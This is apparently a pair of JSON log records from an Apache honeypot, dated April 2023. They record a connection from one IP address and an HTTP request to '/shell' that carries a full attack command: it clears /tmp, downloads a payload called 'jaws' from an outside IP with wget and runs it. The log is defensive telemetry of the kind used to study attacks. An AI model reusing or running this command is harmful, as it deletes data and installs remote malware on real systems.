{"customerid":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413","honeyserverid":"87422976-5cd1-469f-9125-4b1f29054ed5","logkind":"connection","honeypotid":"8BE585FB-2F2F-4BC6-8848-4165C1C4AA46","honeypotname":"apache-server","time":"2023-04-02T23:58:22.287968","parsedMessage":{"timestamp":"2023-04-02 23:58:22.287968","message_type":null,"correlation_id":null,"level":"INFO","message":"connection-log connection from 45.7.188.47:33836 to port 80","ip":"45.7.188.47"},"id":"928c772a-ab53-4e35-b006-bed28b7840d2","EventProcessedUtcTime":"2023-04-02T23:58:22.7589961Z","PartitionId":0,"EventEnqueuedUtcTime":"2023-04-02T23:58:22.5310000Z","path":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413/87422976-5cd1-469f-9125-4b1f29054ed5/apache-server/45.7.188.47"}
{"customerid":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413","honeyserverid":"87422976-5cd1-469f-9125-4b1f29054ed5","logkind":"honeypot","honeypotid":"8BE585FB-2F2F-4BC6-8848-4165C1C4AA46","honeypotname":"apache-server","time":"Sun Apr  2 23:59:01 UTC 2023","parsedMessage":{"timestamp":"2023-04-02 23:58:22+00:00","message_type":"http-access","correlation_id":null,"level":"WARNING","message":"45.7.188.47 - - \"GET /shell?cd+/tmp;rm+-rf+*;wget+161.35.208.230/jaws;sh+/tmp/jaws HTTP/1.1\" 404 488 \"-\" \"Hello, world\"","ip":"45.7.188.47"},"id":"21d69874-4663-4a1b-98d0-7ae4a4a67c3d","EventProcessedUtcTime":"2023-04-02T23:59:02.3529196Z","PartitionId":0,"EventEnqueuedUtcTime":"2023-04-02T23:59:02.1280000Z","path":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413/87422976-5cd1-469f-9125-4b1f29054ed5/apache-server/45.7.188.47"}